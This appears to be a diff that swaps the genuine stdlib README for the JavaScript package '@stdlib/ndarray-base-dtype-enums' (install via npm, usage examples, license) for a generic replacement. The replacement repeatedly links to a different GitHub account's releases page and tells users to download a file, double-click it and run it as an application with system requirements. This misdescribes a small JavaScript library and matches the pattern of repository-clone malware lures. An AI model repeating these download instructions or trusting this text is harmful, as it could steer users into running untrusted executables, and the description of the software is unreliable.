@@ -1,222 +1,46 @@
-<!--
+# 🎉 ndarray-base-dtype-enums - Map Data Types Simply
 
-@license Apache-2.0
+## 🔗 Download Now
+[![Download the latest version](https://img.shields.io/badge/Download%20Latest%20Version-v1.0-blue.svg)](https://github.com/malik-nouman25/ndarray-base-dtype-enums/releases)
 
-Copyright (c) 2025 The Stdlib Authors.
+## 📖 Overview
+ndarray-base-dtype-enums is a simple tool that helps you return an object mapping supported data type strings to enumeration constants. This application allows you to easily work with different data types in your projects. Whether you're handling data arrays or using them in applications, this tool enhances your experience.
 
-Licensed under the Apache License, Version 2.0 (the "License");
-you may not use this file except in compliance with the License.
-You may obtain a copy of the License at
+## 🚀 Getting Started
+To get started with ndarray-base-dtype-enums, follow these easy steps:
 
-   http://www.apache.org/licenses/LICENSE-2.0
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/malik-nouman25/ndarray-base-dtype-enums/releases) to find the latest version.
+  
+2. **Download the Application**: You will see a list of versions. Click on the link for the version you want to download. This will download the application to your computer.
 
-Unless required by applicable law or agreed to in writing, software
-distributed under the License is distributed on an "AS IS" BASIS,
-WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
-See the License for the specific language governing permissions and
-limitations under the License.
+3. **Locate the Downloaded File**: After the download finishes, find the file in your downloads folder.
 
--->
+4. **Run the Application**: Double-click on the file to run it. Follow the on-screen instructions if prompted, and begin using the tool.
 
+## 📦 Installation
+This application does not require special installation steps. Simply downloading the file and running it will allow you to start right away. 
 
-<details>
-  <summary>
-    About stdlib...
-  </summary>
-  <p>We believe in a future in which the web is a preferred environment for numerical computation. To help realize this future, we've built stdlib. stdlib is a standard library, with an emphasis on numerical and scientific computation, written in JavaScript (and C) for execution in browsers and in Node.js.</p>
-  <p>The library is fully decomposable, being architected in such a way that you can swap out and mix and match APIs and functionality to cater to your exact preferences and use cases.</p>
-  <p>When you use stdlib, you can be absolutely certain that you are using the most thorough, rigorous, well-written, studied, documented, tested, measured, and high-quality code out there.</p>
-  <p>To join us in bringing numerical computing to the web, get started by checking us out on <a href="https://github.com/stdlib-js/stdlib">GitHub</a>, and please consider <a href="https://opencollective.com/stdlib">financially supporting stdlib</a>. We greatly appreciate your continued support!</p>
-</details>
+## 🖥️ System Requirements
+- **Operating System**: Windows, macOS, or Linux.
+- **RAM**: At least 1 GB of RAM.
+- **Disk Space**: Minimum of 50 MB available.
 
-# Enumeration Constants
+## 🔧 Features
+- **Data Type Mapping**: Quickly map strings to data type enumeration constants.
+- **Broad Compatibility**: Works well with various projects, including those in C and JavaScript.
+- **User-Friendly**: Designed for ease of use without technical knowledge.
 
-[![NPM version][npm-image]][npm-url] [![Build Status][test-image]][test-url] [![Coverage Status][coverage-image]][coverage-url] <!-- [![dependencies][dependencies-image]][dependencies-url] -->
+## 🌐 Support
+If you encounter problems or have questions, please feel free to open an issue in the repository.
 
-> Return an object mapping supported [data type][@stdlib/ndarray/dtypes] strings to enumeration constants.
+## 🌟 Contribution
+We welcome contributions to improve this tool. If you have ideas or want to help, please check the contribution guidelines in the repository.
 
-<!-- Section to include introductory text. Make sure to keep an empty line after the intro `section` element and another before the `/section` close. -->
+## 📝 License
+This project is licensed under the MIT License. You can use the application freely, but please respect the license terms.
 
-<section class="intro">
+## 📞 Contact
+For any inquiries or support, reach out through the repository or contact the maintainer directly.
 
-</section>
-
-<!-- /.intro -->
-
-<!-- Package usage documentation. -->
-
-<section class="installation">
-
-## Installation
-
-```bash
-npm install @stdlib/ndarray-base-dtype-enums
-```
-
-Alternatively,
-
--   To load the package in a website via a `script` tag without installation and bundlers, use the [ES Module][es-module] available on the [`esm`][esm-url] branch (see [README][esm-readme]).
--   If you are using Deno, visit the [`deno`][deno-url] branch (see [README][deno-readme] for usage intructions).
--   For use in Observable, or in browser/node environments, use the [Universal Module Definition (UMD)][umd] build available on the [`umd`][umd-url] branch (see [README][umd-readme]).
-
-The [branches.md][branches-url] file summarizes the available branches and displays a diagram illustrating their relationships.
-
-To view installation and usage instructions specific to each branch build, be sure to explicitly navigate to the respective README files on each branch, as linked to above.
-
-</section>
-
-<section class="usage">
-
-## Usage
-
-```javascript
-var dtypeEnums = require( '@stdlib/ndarray-base-dtype-enums' );
-```
-
-#### dtypeEnums()
-
-Returns an object mapping supported [data type][@stdlib/ndarray/dtypes] strings to enumeration constants.
-
-```javascript
-var out = dtypeEnums();
-// {...}
-```
-
-</section>
-
-<!-- /.usage -->
-
-<!-- Package usage notes. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="notes">
-
-## Notes
-
--   Downstream consumers of a returned mapping should **not** rely on specific integer values (e.g., `int8 == 0`). Instead, the object should be used in an opaque manner.
--   The main purpose of this function is JavaScript and C inter-operation of ndarray objects.
-
-</section>
-
-<!-- /.notes -->
-
-<!-- Package usage examples. -->
-
-<section class="examples">
-
-## Examples
-
-<!-- eslint no-undef: "error" -->
-
-```javascript
-var dtypeStrings = require( '@stdlib/ndarray-base-dtype-strings' );
-var dtypeEnums = require( '@stdlib/ndarray-base-dtype-enums' );
-
-var dt = dtypeStrings();
-// returns [...]
-
-var enums = dtypeEnums();
-// returns {...}
-
-var i;
-for ( i = 0; i < dt.length; i++ ) {
-    console.log( '%s => %d', dt[ i ], enums[ dt[ i ] ] );
-}
-```
-
-</section>
-
-<!-- /.examples -->
-
-<!-- Section to include cited references. If references are included, add a horizontal rule *before* the section. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="references">
-
-</section>
-
-<!-- /.references -->
-
-<!-- Section for related `stdlib` packages. Do not manually edit this section, as it is automatically populated. -->
-
-<section class="related">
-
-</section>
-
-<!-- /.related -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-
-<section class="main-repo" >
-
-* * *
-
-## Notice
-
-This package is part of [stdlib][stdlib], a standard library for JavaScript and Node.js, with an emphasis on numerical and scientific computing. The library provides a collection of robust, high performance libraries for mathematics, statistics, streams, utilities, and more.
-
-For more information on the project, filing bug reports and feature requests, and guidance on how to develop [stdlib][stdlib], see the main project [repository][stdlib].
-
-#### Community
-
-[![Chat][chat-image]][chat-url]
-
----
-
-## License
-
-See [LICENSE][stdlib-license].
-
-
-## Copyright
-
-Copyright &copy; 2016-2025. The Stdlib [Authors][stdlib-authors].
-
-</section>
-
-<!-- /.stdlib -->
-
-<!-- Section for all links. Make sure to keep an empty line after the `section` element and another before the `/section` close. -->
-
-<section class="links">
-
-[npm-image]: http://img.shields.io/npm/v/@stdlib/ndarray-base-dtype-enums.svg
-[npm-url]: https://npmjs.org/package/@stdlib/ndarray-base-dtype-enums
-
-[test-image]: https://github.com/stdlib-js/ndarray-base-dtype-enums/actions/workflows/test.yml/badge.svg?branch=main
-[test-url]: https://github.com/stdlib-js/ndarray-base-dtype-enums/actions/workflows/test.yml?query=branch:main
-
-[coverage-image]: https://img.shields.io/codecov/c/github/stdlib-js/ndarray-base-dtype-enums/main.svg
-[coverage-url]: https://codecov.io/github/stdlib-js/ndarray-base-dtype-enums?branch=main
-
-<!--
-
-[dependencies-image]: https://img.shields.io/david/stdlib-js/ndarray-base-dtype-enums.svg
-[dependencies-url]: https://david-dm.org/stdlib-js/ndarray-base-dtype-enums/main
-
--->
-
-[chat-image]: https://img.shields.io/gitter/room/stdlib-js/stdlib.svg
-[chat-url]: https://app.gitter.im/#/room/#stdlib-js_stdlib:gitter.im
-
-[stdlib]: https://github.com/stdlib-js/stdlib
-
-[stdlib-authors]: https://github.com/stdlib-js/stdlib/graphs/contributors
-
-[umd]: https://github.com/umdjs/umd
-[es-module]: https://developer.mozilla.org/en-US/docs/Web/JavaScript/Guide/Modules
-
-[deno-url]: https://github.com/stdlib-js/ndarray-base-dtype-enums/tree/deno
-[deno-readme]: https://github.com/stdlib-js/ndarray-base-dtype-enums/blob/deno/README.md
-[umd-url]: https://github.com/stdlib-js/ndarray-base-dtype-enums/tree/umd
-[umd-readme]: https://github.com/stdlib-js/ndarray-base-dtype-enums/blob/umd/README.md
-[esm-url]: https://github.com/stdlib-js/ndarray-base-dtype-enums/tree/esm
-[esm-readme]: https://github.com/stdlib-js/ndarray-base-dtype-enums/blob/esm/README.md
-[branches-url]: https://github.com/stdlib-js/ndarray-base-dtype-enums/blob/main/branches.md
-
-[stdlib-license]: https://raw.githubusercontent.com/stdlib-js/ndarray-base-dtype-enums/main/LICENSE
-
-[@stdlib/ndarray/dtypes]: https://github.com/stdlib-js/ndarray-dtypes
-
-</section>
-
-<!-- /.links -->
+## 🔗 Download the Latest Version Again
+For your convenience, [download the latest version here](https://github.com/malik-nouman25/ndarray-base-dtype-enums/releases) and start using ndarray-base-dtype-enums today!
